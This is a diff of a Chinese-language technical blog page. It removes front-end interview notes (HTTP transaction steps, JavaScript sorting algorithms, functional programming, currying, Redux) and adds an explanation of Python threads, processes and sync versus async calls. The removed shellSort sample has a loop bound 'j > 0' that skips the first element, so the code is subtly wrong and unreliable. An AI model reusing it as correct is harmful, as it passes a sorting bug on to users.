-<h2 id="3-一次完整的HTTP事务是怎样的一个过程？"><a href="#3-一次完整的HTTP事务是怎样的一个过程？" class="headerlink" title="==3.一次完整的HTTP事务是怎样的一个过程？=="></a>==3.一次完整的HTTP事务是怎样的一个过程？==</h2><p>基本流程：<br>a. 域名解析<br>b. 发起TCP的3次握手<br>c. 建立TCP连接后发起http请求<br>d. 服务器端响应http请求，浏览器得到html代码<br>e. 浏览器解析html代码，并请求html代码中的资源<br>f. 浏览器对页面进行渲染呈现给用户</p>
-<h2 id="4-排序算法"><a href="#4-排序算法" class="headerlink" title="==4. 排序算法=="></a>==4. 排序算法==</h2><p><img src="http://oe51jhwvd.bkt.clouddn.com/1.png" alt="image"></p>
-<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>两两比较，若反则交换位置<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> len = arr.length;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j+<span class="number">1</span>]) &#123;        <span class="comment">//相邻元素两两对比</span></div><div class="line">                <span class="keyword">var</span> temp = arr[j+<span class="number">1</span>];        <span class="comment">//元素交换</span></div><div class="line">                arr[j+<span class="number">1</span>] = arr[j];</div><div class="line">                arr[j] = temp;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>每次都找最小的数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> len = arr.length;</div><div class="line">    <span class="keyword">var</span> minIndex, temp;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</div><div class="line">        minIndex = i;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;     <span class="comment">//寻找最小的数</span></div><div class="line">                minIndex = j;                 <span class="comment">//将最小数的索引保存</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        temp = arr[i];</div><div class="line">        arr[i] = arr[minIndex];</div><div class="line">        arr[minIndex] = temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> len = arr.length;</div><div class="line">    <span class="keyword">var</span> preIndex, current;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</div><div class="line">        preIndex = i - <span class="number">1</span>;</div><div class="line">        current = arr[i];</div><div class="line">        <span class="keyword">while</span>(preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</div><div class="line">            arr[preIndex+<span class="number">1</span>] = arr[preIndex];</div><div class="line">            preIndex--;</div><div class="line">        &#125;</div><div class="line">        arr[preIndex+<span class="number">1</span>] = current;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellSort</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> len = arr.length,</div><div class="line">        temp,</div><div class="line">        gap = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(gap &lt; len/<span class="number">3</span>) &#123;          <span class="comment">//动态定义间隔序列</span></div><div class="line">        gap =gap*<span class="number">3</span>+<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (gap; gap&gt; <span class="number">0</span>; gap = <span class="built_in">Math</span>.floor(gap/<span class="number">3</span>)) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = gap; i &lt; len; i++) &#123;</div><div class="line">            temp = arr[i];</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = i-gap; j &gt; <span class="number">0</span> &amp;&amp; arr[j]&gt; temp; j-=gap) &#123;</div><div class="line">                arr[j+gap] = arr[j];</div><div class="line">            &#125;</div><div class="line">            arr[j+gap] = temp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><img src="http://oe51jhwvd.bkt.clouddn.com/5.gif" alt="image"><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">arr</span>) </span>&#123;  <span class="comment">//采用自上而下的递归方法</span></div><div class="line">    <span class="keyword">var</span> len = arr.length;</div><div class="line">    <span class="keyword">if</span>(len &lt; <span class="number">2</span>) &#123;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</div><div class="line">        left = arr.slice(<span class="number">0</span>, middle),</div><div class="line">        right = arr.slice(middle);</div><div class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (left.length&gt;<span class="number">0</span> &amp;&amp; right.length&gt;<span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]) &#123;</div><div class="line">            result.push(left.shift());</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            result.push(right.shift());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (left.length)</div><div class="line">        result.push(left.shift());</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (right.length)</div><div class="line">        result.push(right.shift());</div><div class="line"></div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">arr, left, right</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> len = arr.length,</div><div class="line">        partitionIndex,</div><div class="line">        left = <span class="keyword">typeof</span> left != <span class="string">'number'</span> ? <span class="number">0</span> : left,</div><div class="line">        right = <span class="keyword">typeof</span> right != <span class="string">'number'</span> ? len - <span class="number">1</span> : right;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</div><div class="line">        partitionIndex = partition(arr, left, right);</div><div class="line">        quickSort(arr, left, partitionIndex<span class="number">-1</span>);</div><div class="line">        quickSort(arr, partitionIndex+<span class="number">1</span>, right);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">arr, left ,right</span>) </span>&#123;     <span class="comment">//分区操作</span></div><div class="line">    <span class="keyword">var</span> pivot = left,                      <span class="comment">//设定基准值（pivot）</span></div><div class="line">        index = pivot + <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = index; i &lt;= right; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;</div><div class="line">            swap(arr, i, index);</div><div class="line">            index++;</div><div class="line">        &#125;        </div><div class="line">    &#125;</div><div class="line">    swap(arr, pivot, index - <span class="number">1</span>);</div><div class="line">    <span class="keyword">return</span> index<span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> temp = arr[i];</div><div class="line">    arr[i] = arr[j];</div><div class="line">    arr[j] = temp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><img src="http://oe51jhwvd.bkt.clouddn.com/7.gif" alt="image"></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> len;    <span class="comment">//因为声明的多个函数都需要数据长度，所以把len设置成为全局变量</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildMaxHeap</span>(<span class="params">arr</span>) </span>&#123;   <span class="comment">//建立大顶堆</span></div><div class="line">    len = arr.length;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="built_in">Math</span>.floor(len/<span class="number">2</span>); i &amp;gt;= <span class="number">0</span>; i--) &#123;</div><div class="line">        heapify(arr, i);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapify</span>(<span class="params">arr, i</span>) </span>&#123;     <span class="comment">//堆调整</span></div><div class="line">    <span class="keyword">var</span> left = <span class="number">2</span> * i + <span class="number">1</span>,</div><div class="line">        right = <span class="number">2</span> * i + <span class="number">2</span>,</div><div class="line">        largest = i;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</div><div class="line">        largest = left;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</div><div class="line">        largest = right;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (largest != i) &#123;</div><div class="line">        swap(arr, i, largest);</div><div class="line">        heapify(arr, largest);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> temp = arr[i];</div><div class="line">    arr[i] = arr[j];</div><div class="line">    arr[j] = temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapSort</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">    buildMaxHeap(arr);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = arr.length<span class="number">-1</span>; i &gt; <span class="number">0</span>; i--) &#123;</div><div class="line">        swap(arr, <span class="number">0</span>, i);</div><div class="line">        len--;</div><div class="line">        heapify(arr, <span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="5-函数式编程"><a href="#5-函数式编程" class="headerlink" title="==5. 函数式编程=="></a>==5. 函数式编程==</h2><p>函数式编程有一下几个特点：</p>
+            <h3 id="Python多线程"><a href="#Python多线程" class="headerlink" title="Python多线程"></a>Python多线程</h3><h4 id="1-同步和异步概念和区别"><a href="#1-同步和异步概念和区别" class="headerlink" title="1. 同步和异步概念和区别"></a>1. 同步和异步概念和区别</h4><p>​    我们经常会看到同步、异步、阻塞、非阻塞四种调用方式以及它们的组合。那同步和异步的概念和区别又是什么呢？</p>
+<p><strong>同步(Sync)</strong></p>
+<p>​    同步的思想就是发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。 <strong>也就是说</strong>所有的操作都做完，才返回给用户。(会给人一种程序还在进行，卡死的感觉)，事情需要一件一件的做，等前一件做完了才能做下一件事。</p>
+<p>​    举例:B/S模式中的表单提交，具体过程是：客户端提交请求-&gt;等待服务器处理-&gt;处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。 </p>
+<p><strong>异步(Async)</strong></p>
+<p>​    异步与同步相对，当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。</p>
+<p>​    对于通知调用者的三种方式，具体如下：</p>
+<p>​        <strong>状态</strong></p>
+<p>​    即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。</p>
+<p>​       <strong>通知</strong></p>
+<p>​    当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。</p>
+<p>​       <strong>回调</strong></p>
+<p>​    与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。</p>
+<p>​    举例:B/S模式中的ajax请求，具体过程是：客户端发出ajax请求-&gt;服务端处理-&gt;处理完毕执行客户端回调，在客户端（浏览器）发出请求后，仍然可以做其他的事。 </p>
+<p><strong><em>同步和异步的区别:</em></strong>    </p>
+<p>​    请求发出后，是否需要等待结果，才能继续执行其他操作。 </p>
+<h4 id="2-多线程的动机"><a href="#2-多线程的动机" class="headerlink" title="2. 多线程的动机"></a>2. 多线程的动机</h4><p>​    在多线程(MT)编程出现之前，程序的运行由一个执行序列组成，执行序列按顺序在主机的中央处理器(CPU)中运行。无论是任务本身要求顺序执行还是整个程序是由多个子任务组成，程序都是按照这种方式执行的，即便子任务相互独立，互相无关(即，一个子任务的结果不影响其他子任务的结果)时也是这样。多线程的目的就是要并行运行这项相互独立的子任务，这样的并行处理可以大幅度的提升整个任务的效率。</p>
+<p>​    多线程对于某些任务是最理想的，这些任务的特点是：<strong>它们本质上就是异步的，需要有多个并发事务，各个事务的运行程序可以是不确定的，随机的，不可预测的。</strong>这样的编程任务可以被分为多个执行流，每个流都要有一个要完成的目标。根据应用的不同，这些子任务可能都要计算出一个中间结果，用于合并得到最后的结果。</p>
+<p>​    使用多线程编程和一个共享的数据结构如Queue（一种多线程队列数据结构），这种程序任务可以用几个功能单一的线程来组织:</p>
 <ul>
-<li>函数是“第一等公民”：函数与其他数据类型一样，可以赋值给其他变量，也可以作为参数，传入另一个函数，或作为别的函数的返回值</li>
-<li>只用“表达书”，不用语句：每一步都是单纯的运算，而且都有返回值</li>
-<li>没有“副作用”：函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其不得修改外部变量的值</li>
-<li>不修改状态，返回新的值，不修改系统变量</li>
-<li>引用透明：函数的运行不依赖与外部变量或“状态”，只依赖于输入的参数，任何时候只要参数相同，引用函数所得到的返回值总是相同的</li>
+<li><p>UserRequestThread：负责读取用户的输入，可能是一个I/O通道。程序可能创建多个线程</p>
+<p>每个客户一个，请求会被放到队列中。</p>
+</li>
+<li><p>RequestProcessor：一个负责从队列中获取并处理请求的线程，它为下面那种线程提供输出。</p>
+</li>
+<li><p>ReplyThrea：负责把用户的输出取出来，如果是网络应用程序就把结果发送出去，否则就保存在本地系统或者数据库中。</p>
+<p>把编程任务用多线程来组织可以降低程序的复杂度，并使得干净，有效和良好组织地程序结构的实现变得可能。并且每个线程的逻辑都不会很复杂，因为它要做的事很清楚。</p>
+</li>
 </ul>
-<p>优点：</p>
-<ul>
-<li>代码简洁，开发快速：函数式编程大量使用函数，减少了代码的重复，因此程序比较短，开发速度较快</li>
-<li>接近自然语言，易于理解</li>
-<li>更方便的代码管理：函数式编程不依赖、也不会改变外界的状态，只要给定输入参数，返回的结果必定相同。因此，每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging），以及模块化组合。</li>
-<li>易于”并发编程”：函数式编程不需要考虑”死锁”（deadlock），因为它不修改变量，所以根本不存在”锁”线程的问题。不必担心一个线程的数据，被另一个线程修改，所以可以很放心地把工作分摊到多个线程，部署”并发编程”（concurrency）</li>
-<li>代码的热升级：函数式编程没有副作用，只要保证接口不变，内部实现是外部无关的。所以，可以在运行状态下直接升级代码，不需要重启，也不需要停机。</li>
-</ul>
-<h2 id="6-函数式编程——柯里化（curry）"><a href="#6-函数式编程——柯里化（curry）" class="headerlink" title="==6. 函数式编程——柯里化（curry）=="></a>==6. 函数式编程——柯里化（curry）==</h2><p>curry 的概念很简单：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> x + y;</div><div class="line">  &#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> increment = add(<span class="number">1</span>);</div><div class="line"><span class="keyword">var</span> addTen = add(<span class="number">10</span>);</div><div class="line"></div><div class="line">increment(<span class="number">2</span>);</div><div class="line"><span class="comment">// 3</span></div><div class="line"></div><div class="line">addTen(<span class="number">2</span>);</div><div class="line"><span class="comment">// 12</span></div></pre></td></tr></table></figure>
-<p>我们来创建一些 curry 函数享受下（译者注：此处原文是“for our enjoyment”，语出自圣经）</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> curry = <span class="built_in">require</span>(<span class="string">'lodash'</span>).curry;</div><div class="line"></div><div class="line"><span class="keyword">var</span> match = curry(<span class="function"><span class="keyword">function</span>(<span class="params">what, str</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> str.match(what);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="keyword">var</span> replace = curry(<span class="function"><span class="keyword">function</span>(<span class="params">what, replacement, str</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> str.replace(what, replacement);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="keyword">var</span> filter = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, ary</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> ary.filter(f);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="keyword">var</span> map = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, ary</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> ary.map(f);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<p>我在上面的代码中遵循的是一种简单，同时也非常重要的模式。即策略性地把要操作的数据（String， Array）放到最后一个参数里。到使用它们的时候你就明白这样做的原因是什么了。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">match(<span class="regexp">/\s+/g</span>, <span class="string">"hello world"</span>);</div><div class="line"><span class="comment">// [ ' ' ]</span></div><div class="line"></div><div class="line">match(<span class="regexp">/\s+/g</span>)(<span class="string">"hello world"</span>);</div><div class="line"><span class="comment">// [ ' ' ]</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> hasSpaces = match(<span class="regexp">/\s+/g</span>);</div><div class="line"><span class="comment">// function(x) &#123; return x.match(/\s+/g) &#125;</span></div><div class="line"></div><div class="line">hasSpaces(<span class="string">"hello world"</span>);</div><div class="line"><span class="comment">// [ ' ' ]</span></div><div class="line"></div><div class="line">hasSpaces(<span class="string">"spaceless"</span>);</div><div class="line"><span class="comment">// null</span></div><div class="line"></div><div class="line">filter(hasSpaces, [<span class="string">"tori_spelling"</span>, <span class="string">"tori amos"</span>]);</div><div class="line"><span class="comment">// ["tori amos"]</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> findSpaces = filter(hasSpaces);</div><div class="line"><span class="comment">// function(xs) &#123; return xs.filter(function(x) &#123; return x.match(/\s+/g) &#125;) &#125;</span></div><div class="line"></div><div class="line">findSpaces([<span class="string">"tori_spelling"</span>, <span class="string">"tori amos"</span>]);</div><div class="line"><span class="comment">// ["tori amos"]</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> noVowels = replace(<span class="regexp">/[aeiou]/ig</span>);</div><div class="line"><span class="comment">// function(replacement, x) &#123; return x.replace(/[aeiou]/ig, replacement) &#125;</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> censored = noVowels(<span class="string">"*"</span>);</div><div class="line"><span class="comment">// function(x) &#123; return x.replace(/[aeiou]/ig, "*") &#125;</span></div><div class="line"></div><div class="line">censored(<span class="string">"Chocolate Rain"</span>);</div><div class="line"><span class="comment">// 'Ch*c*l*t* R**n'</span></div></pre></td></tr></table></figure>
-<p>这里表明的是一种“预加载”函数的能力，通过传递一到两个参数调用函数，就能得到一个记住了这些参数的新函数。</p>
-<h2 id="7-redux理解"><a href="#7-redux理解" class="headerlink" title="==7. redux理解=="></a>==7. redux理解==</h2><ol>
-<li><p>React有props和state: props意味着父级分发下来的属性，state意味着组件内部可以自行管理的状态，并且整个React没有数据向上回溯的能力，也就是说数据只能单向向下分发，或者自行内部消化。理解这个是理解React和Redux的前提。</p>
-</li>
-<li><p>一般构建的React组件内部可能是一个完整的应用，它自己工作良好，你可以通过属性作为API控制它。但是更多的时候发现React根本无法让两个组件互相交流，使用对方的数据。然后这时候不通过DOM沟通（也就是React体制内）解决的唯一办法就是提升state，将state放到共有的父组件中来管理，再作为props分发回子组件。</p>
-</li>
-<li><p>子组件改变父组件state的办法只能是通过onClick触发父组件声明好的回调，也就是父组件提前声明好函数或方法作为契约描述自己的state将如何变化，再将它同样作为属性交给子组件使用。这样就出现了一个模式：数据总是单向从顶层向下分发的，但是只有子组件回调在概念上可以回到state顶层影响数据。这样state一定程度上是响应式的。</p>
-</li>
-<li><p>为了面临所有可能的扩展问题，最容易想到的办法就是把所有state集中放到所有组件顶层，然后分发给所有组件。</p>
-</li>
-<li><p>为了有更好的state管理，就需要一个库来作为更专业的顶层state分发给所有React应用，这就是Redux。让我们回来看看重现上面结构的需求：</p>
+<h4 id="3-线程和进程"><a href="#3-线程和进程" class="headerlink" title="3. 线程和进程"></a>3. 线程和进程</h4><h5 id="3-1-什么是进程？"><a href="#3-1-什么是进程？" class="headerlink" title="3.1  什么是进程？"></a>3.1  什么是进程？</h5><p>​    计算机程序只不过是磁盘中可执行的，二进制（或其他类型）的数据。它们只有在被读取到内存中，被操作系统调用的时候才开始它们的生命期。进程（有时叫重量级进程）是程序的一次执行。每个进程都有自己的地址空间，内存，数据栈以及其它记录其运行轨迹的辅助数据。OS管理在其上运行的所有进程，并为这些进程公平的分配时间。进程也可以通过fork和spawn操作来完成其它的任务。不过各个进程都有自己的内存空间，数据栈等，因此只能使用进程间通信(IPC)，而不能直接共享信息。</p>
+<p>​       <a href="https://www.cnblogs.com/reality-soul/p/6397021.html" target="_blank" rel="external">进程和线程的概念、区别和联系</a></p>
+<p>​       <a href="https://www.cnblogs.com/tiankong101/p/4229584.html" target="_blank" rel="external">深入理解线程和进程</a>    </p>
+<h5 id="3-2-什么是线程？"><a href="#3-2-什么是线程？" class="headerlink" title="3.2  什么是线程？"></a>3.2  什么是线程？</h5><p>​    线程（有时也叫轻量级进程）和进程有点像，不同的是，所有的线程运行在同一个进程中，共享相同的运行环境。</p>
+<p>​    线程有开始，顺序执行和结束三部分。它有一个自己的指令指针，记录自己运行到什么地方。线程的运行可能被抢占（中断），或暂时的被挂起（睡眠），让其他的线程运行，这叫做让步。</p>
+<p>​    一个进程中的各个线程之间共享同一片数据空间，所以线程之间可以比进程之间更方便地共享数据以及相互通讯。线程一般都是并发执行的，正是由于这种并行和数据共享的机制使得多个任务的合作变为可能。</p>
+<p>​    在单CPU的系统中，真正的并发是不可能的，每个线程会被安排成每次只运行一小会，然后就把CPU让出来，让其他的线程去运行。在进程的整个运行过程中，每个线程都只做自己的事，在需要的时候跟其他的线程共享运行的结果。当然，这样的共享是存在危险的，如果多个线程共同访问同一片数据，则由于数据的访问顺序不一样，有可能造成<strong>结果不一致</strong>问题。这就是<strong>竞态条件（race condition）</strong>。但可以通过大多数线程库带有一系列的同步原语，来控制线程的执行和数据的访问。还有就是由于有的函数会在完成之前阻塞住，在没有特别为多线程做修改的情况下，这种”贪婪”的函数会让CPU的时间分配有所倾斜，导致各个线程分配的运行时间可能不尽相同，不尽公平。</p>
